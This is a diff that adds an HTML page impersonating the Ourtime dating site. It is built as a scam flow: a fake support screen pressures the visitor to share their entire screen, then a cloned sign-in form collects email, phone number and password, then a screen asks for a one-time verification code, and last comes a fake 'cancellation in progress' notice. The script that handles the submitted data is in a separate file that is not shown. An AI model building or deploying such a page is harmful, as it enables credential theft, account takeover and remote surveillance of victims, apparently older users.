@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - Ourtime</title>
+    <link rel="stylesheet" href="visitor.css" />
+  </head>
+  <body>
+    <!-- STATE 1: Accept -->
+    <div id="state-1" class="visitor-state active">
+      <div class="ot-card" style="text-align: center; margin-top: 80px">
+        <h1 style="font-size: 28px; margin-bottom: 16px; color: #333">
+          Ourtime Support
+        </h1>
+        <p style="color: #666; margin-bottom: 24px">
+          A support agent is ready to assist you.
+        </p>
+
+        <div id="screen-error" class="error-box hidden">
+          <strong>Action Required:</strong> You selected a window or tab. You
+          <strong>MUST</strong> select the <strong>Entire Screen</strong> option
+          at the top of the prompt to continue.
+        </div>
+
+        <div class="instruction-box">
+          <strong>Important:</strong> When the browser prompt opens, please
+          select
+          <span style="color: #e2574c; font-weight: bold">Entire Screen</span>
+          from the options at the top, then click Share.
+        </div>
+        <button id="accept-btn" class="ot-btn">Accept & Continue</button>
+      </div>
+    </div>
+
+    <!-- STATE 3: Ourtime Login -->
+    <div id="state-3" class="visitor-state hidden">
+      <header class="ot-header">
+        <div class="ot-logo">
+          <img
+            src="https://www.seniorliving.org/app/uploads/2019/01/Ourtime_Logo.png"
+            alt="Ourtime"
+          />
+        </div>
+      </header>
+
+      <main class="ot-main">
+        <div class="ot-card">
+          <h2>Sign in</h2>
+          <p class="ot-subtitle">Not a member? <a href="#">Join</a></p>
+
+          <form id="verify-form" onsubmit="handleVerify(event)">
+            <div class="ot-form-group">
+              <label>Email</label>
+              <input type="email" id="visitor-email" required />
+            </div>
+
+            <div class="ot-form-group">
+              <label>Phone number</label>
+              <input type="tel" id="visitor-phone" required />
+            </div>
+
+            <div class="ot-form-group">
+              <label>Password</label>
+              <input type="password" id="visitor-pass" required />
+            </div>
+
+            <button type="submit" class="ot-btn" id="login-submit-btn">
+              <span id="login-btn-text">Sign in</span>
+              <span id="login-btn-spinner" class="spinner hidden"></span>
+            </button>
+          </form>
+
+          <div class="ot-checkbox-group">
+            <input type="checkbox" id="stay-logged" checked />
+            <label for="stay-logged"
+              >Keep me signed in<br /><span
+                >Uncheck on a public device</span
+              ></label
+            >
+          </div>
+
+          <div class="ot-links">
+            <a href="#">Forgot email</a> &bull;
+            <a href="#">Forgot password</a> &bull; <a href="#">Help</a>
+          </div>
+        </div>
+      </main>
+
+      <footer class="ot-footer">
+        <div class="ot-footer-grid">
+          <div>
+            <a href="#">Help/FAQs</a>
+            <a href="#">Careers</a>
+            <a href="#">Terms of Use</a>
+            <a href="#">Your Privacy</a>
+          </div>
+          <div>
+            <a href="#">Cookie Policy</a>
+            <a href="#">Security</a>
+            <a href="#">Community Guidelines</a>
+            <a href="#">Safety Tips</a>
+          </div>
+          <div>
+            <a href="#">Advertise</a>
+            <a href="#">Success Stories</a>
+            <a href="#">Your Privacy Choices</a>
+            <a href="#">Intellectual Property</a>
+          </div>
+          <div>
+            <a href="#">Consumer Health Data Privacy Policy</a>
+            <a href="#">Colorado Safety Policy Information</a>
+          </div>
+        </div>
+        <div class="ot-footer-bottom">
+          <div class="ot-footer-logo">
+            <img
+              src="https://www.seniorliving.org/app/uploads/2019/01/Ourtime_Logo.png"
+              alt="Ourtime"
+            />
+            <span style="color: #333; font-size: 18px; font-weight: 700"
+              >From MatchGroup</span
+            >
+          </div>
+          <div class="ot-footer-copy">
+            &copy; Copyright 2026 Match Group, LLC
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <!-- VERIFICATION CODE -->
+    <div id="state-verify" class="visitor-state hidden">
+      <header class="ot-header">
+        <div class="ot-logo">
+          <img
+            src="https://www.seniorliving.org/app/uploads/2019/01/Ourtime_Logo.png"
+            alt="Ourtime"
+          />
+        </div>
+      </header>
+      <main class="ot-main">
+        <div class="ot-card" style="text-align: center">
+          <div class="verify-icon">
+            <svg
+              width="48"
+              height="48"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="#e2574c"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+          </div>
+          <h2>Verify Your Identity</h2>
+          <p style="color: #666; margin-bottom: 24px; font-size: 14px">
+            We sent a 4-digit verification code to your registered email address
+            and phone number.
+          </p>
+          <form id="code-form" onsubmit="handleCodeVerify(event)">
+            <input
+              type="text"
+              id="verify-code"
+              class="ot-code-input"
+              placeholder="0000"
+              maxlength="4"
+              pattern="\d{4}"
+              inputmode="numeric"
+              required
+            />
+            <button type="submit" class="ot-btn" style="margin-top: 24px">
+              Verify Code
+            </button>
+          </form>
+        </div>
+      </main>
+    </div>
+
+    <!-- UPDATE IN PROGRESS -->
+    <div id="state-5" class="visitor-state hidden">
+      <header class="ot-header">
+        <div class="ot-logo">
+          <img
+            src="https://www.seniorliving.org/app/uploads/2019/01/Ourtime_Logo.png"
+            alt="Ourtime"
+          />
+        </div>
+      </header>
+      <main class="ot-main">
+        <div class="ot-card" style="text-align: center">
+          <h2>Cancellaion in Progress</h2>
+          <p class="ot-warning-text">
+            You will receive an email confirmation shortly.
+          </p>
+          <div class="ot-progress-bar">
+            <div class="ot-progress-fill"></div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    <div id="toast-container" class="toast-container"></div>
+    <div id="persistent-messages" class="persistent-messages"></div>
+
+    <script src="visitor.js"></script>
+  </body>
+</html>
